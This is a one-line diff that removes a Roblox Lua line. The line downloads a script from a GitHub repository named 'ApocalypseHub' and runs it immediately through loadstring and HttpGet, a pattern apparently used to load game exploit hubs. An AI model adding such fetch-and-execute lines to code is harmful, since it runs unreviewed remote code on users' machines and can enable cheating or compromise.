@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ApocalypseHub/Apocalypse/main/main.lua"))()
